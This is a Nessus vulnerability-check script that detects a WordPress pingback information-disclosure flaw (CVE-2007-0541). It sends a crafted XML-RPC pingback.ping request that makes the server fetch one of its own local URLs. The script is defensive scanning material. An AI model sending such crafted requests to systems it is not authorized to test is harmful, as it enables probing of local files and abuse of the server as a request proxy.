#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24237);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-0541");
  script_bugtraq_id(22220);
  script_xref(name:"OSVDB", value:"33007");

  script_name(english:"WordPress Pingback File Information Disclosure");
  script_summary(english:"Tries to access a local file via WordPress' Pingback"); 

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host fails to
sanitize the 'sourceURI' before passing it to the 'wp_remote_fopen()'
function when processing pingbacks.  An unauthenticated remote
attacker can leverage this issue to, say, determine the existence of
local files and possibly even to view parts of those files, subject to
the permissions of the web server user id. 

In addition, the version is also reportedly susceptible to a denial of
service attack because it allows an anonymous attacker to cause a
server to fetch arbitrary URLs without limits." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/458003/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://comox.textdrive.com/pipermail/wp-svn/2007-January/002387.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WordPress version 2.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(dir, "/xmlrpc.php");

  # Make sure the script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("XML-RPC server accepts POST requests only" >< res)
  {
    # See if we can access a local file.
    postdata = string(
      '<?xml version="1.0"?>', "\r\n",
      "<methodCall>\r\n",
      "  <methodName>pingback.ping</methodName>\r\n",
      "    <params>\r\n",
      "      <param>\r\n",
      "        <value><string>index.php</string></value>\r\n",
      "      </param>\r\n",
      "      <param>\r\n",
      "        <value><string>http://", get_host_name(), dir, "/#p</string></value>\r\n",
      "      </param>\r\n",
      "    </params>\r\n",
      "  </methodCall>\r\n"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: text/xml\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we could access the local file.
    #
    # nb: 2.1 reports "The source URL does not exist." and a fault code of 16.
    if ("We cannot find a title on that page." >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
